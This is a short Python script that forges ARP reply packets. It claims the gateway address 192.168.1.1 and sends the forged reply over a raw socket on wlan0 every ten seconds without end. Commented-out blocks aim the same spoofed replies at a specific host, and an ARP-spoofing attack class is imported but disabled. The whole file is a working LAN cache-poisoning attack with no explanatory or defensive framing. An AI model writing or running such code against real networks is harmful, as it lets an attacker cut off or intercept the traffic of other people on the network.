from layers.ethernet import Ethernet
from general.general import General
from layers.arp import ARP

#from attack.lan import ARPSpoofing



import binascii
import socket
import struct
import time
from time import sleep 
#header arp
arp = ARP()
arp.hard_type = 1
arp.opcode = 2
arp.src_ip = '192.168.1.1'
arp.src_mac = 'ff:ff:ff:ff:ff:ff'
arp.dst_mac = 'ff:ff:ff:ff:ff:ff'
arp.dst_ip = '192.168.1.255'
sendarp = arp.create()


"""
arp2 = ARP()
arp2.hard_type = 1
arp2.opcode = 2
arp2.src_ip = '192.168.1.1'
arp2.src_mac = '50:3e:aa:32:bd:9b'
arp2.dst_mac = 'cc:61:e5:96:b7:e3'
arp2.dst_ip = '192.168.1.109'
sendarp2 = arp2.create()

"""
#end header arp
#header ethernet
ethernet = Ethernet()
ethernet.src_mac = 'ff:ff:ff:ff:ff:ff'
ethernet.dst_mac = '00:00:00:00:00:00'
ethernet.type = 0x0806
sendether = ethernet.create()
"""
ethernet2 = Ethernet()
ethernet2.src_mac = '50:3e:aa:32:bd:9b'
ethernet2.dst_mac = 'cc:61:e5:96:b7:e3'
ethernet2.type = 0x0806
sendether2 = ethernet2.create()
"""

#end ethernent

s = socket.socket(socket.AF_PACKET,socket.SOCK_RAW)
s.bind(('wlan0',0))

#rsp = ARPSpoofing('wlan0','192.168.1.1','192.168.1.103')

while True:
	s.send(sendether+sendarp)
	sleep(10)	
	#s.send(sendether2+sendarp2)

	